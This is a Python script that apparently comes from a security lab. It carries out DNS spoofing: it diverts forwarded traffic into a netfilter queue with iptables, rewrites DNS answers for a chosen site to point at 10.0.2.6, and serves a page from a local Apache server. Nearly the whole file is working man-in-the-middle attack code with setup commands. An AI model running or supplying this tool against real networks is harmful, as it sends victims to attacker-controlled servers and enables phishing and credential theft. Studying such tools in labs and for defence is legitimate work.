#!/usr/bin/env python
import subprocess
import netfilterqueue
import scapy.all as scapy


# Flush caches for Windows 10 (ipconfig /flushdns)

def process_packet(packet):
    # make a scapy packet from packets so we get more information
    scapy_packet = scapy.IP(packet.get_payload())
    # if it is a dns response
    if scapy_packet.haslayer(scapy.DNSRR):
        # check if it has the same wanted siteURL
        qname = scapy_packet[scapy.DNSQR].qname
        if siteURL in str(qname):
            print('[+] Spoofing ' + siteURL)
            # Make DNS response with the specified spoofed ip
            answer = scapy.DNSRR(rrname=qname, rdata='10.0.2.6')
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].acount = 1
            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum
            packet.set_payload(bytes(scapy_packet))
    packet.accept()


try:
    # Start Linux server
    subprocess.call(['service', 'apache2', 'start'])
    # Enter the queue number which you want to trap packets into
    queueNum = input("Please enter the queue number ")
    # use the following 2 commands to trap current machine packets
    # subprocess.call(['iptables', '-I', 'INPUT', '-j', 'NFQUEUE', '--queue-num', queueNum])
    # subprocess.call(['iptables', '-I', 'OUTPUT', '-j', 'NFQUEUE', '--queue-num', queueNum])
    # or use this command to trap a remote machine packets
    subprocess.call(['iptables', '-I', 'FORWARD', '-j', 'NFQUEUE', '--queue-num', queueNum])
    siteURL = input("please enter the site url (for example:www.bing.com)")
    queue = netfilterqueue.NetfilterQueue()
    # bind the queue with a function to apply on the trapped packets
    queue.bind(int(queueNum), process_packet)
    queue.run()
except(KeyboardInterrupt):
    print('[+] Keyboard interrupt detected ... Resetting IP Tables')
    subprocess.call(['iptables', '--flush'])
    # Stop Linux server
    subprocess.call(['service', 'apache2', 'stop'])
    
# ///// Some commands we used or might be using
# iptables -I FORWARD -j NFQUEUE --queue-num 0
# web server start on kali command is (service apache2 start)
# sudo systemctl enable systemd-resolved.service
# sudo systemd-resolve --flush-caches
